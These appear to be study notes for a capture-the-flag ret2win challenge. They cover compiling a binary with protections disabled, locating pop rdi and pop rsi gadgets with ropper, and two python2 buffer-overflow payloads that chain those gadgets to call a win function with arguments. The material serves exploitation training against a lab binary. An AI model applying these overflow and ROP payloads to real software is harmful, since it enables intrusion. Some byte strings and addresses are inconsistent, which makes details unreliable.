This is a typical ret2win challenge. We must return to another function in order to win.
    - However, we have introduced parameters/args in this challenge
    - There is a profound difference between 32-bit and 64-bit
    - Notice how our special function is not contained within main(), but is still in the program
    - We must be sure to find main()'s return address and overwrite it with another function's address
    - How does this change our exploitation process with parameters?
        - Notice how main() does NOT have parameters, but the function we are targeting, does

Be sure to utilize the command 'pwn template' to structure your exploit for this challenge!

This is a direct copy from CryptoCat's challenge. It's truly perfect, no need to change.

Compile: 
    32-bit: gcc 03.c -o 03 -m32 -fno-stack-protector -z execstack -no-pie -g
    64-bit: gcc 03.c -o 03 -m64 -fno-stack-protector -z execstack -no-pie -g
        - NOTE: I had an issue with the x64 challenge. I had to used cryptocat's pre-compiled binary as I was dealing with a glibc mismatch. I had a newer version that did not feature the same ROP gadgets as his. 


padding + pop_rdi + param_1 + pop_rsi + param_2 + junk + hacked()
    - You need to make sure that you have the data inside the registers and that they are in place and then lastly, call the function
    - We can get this with ropper --file ret2win_params --search "pop rdi"
    - ropper --file ret2win_params --search "pop rsi"

Manual Exploit: 
python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x76\x11\x40\x00\x00\x00\x00\x00"'
// We can't just throw our params onto the stack, We need to pop our parameters into our RDI register (1st parameter)... we need a gadget to do this

rdi ROP gadget: 40124b "\x4b\x12\x40\x00\x00\x00\x00\x00"
param_1: 0xdeadbeef "\xef\xbe\xad\xde\xef\xbe\xad\xde"

rsi ROP gadget: 401249 "\x49\x12\x40\x00\x00\x00\x00\x00"
param_2: 0xc0debabe "\xbe\xba\xde\xc0\x00\x00\x00\x00\x00"




padding + pop_rdi + param_1 + pop_rsi + param_2 + junk + hacked() 401142

python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"'
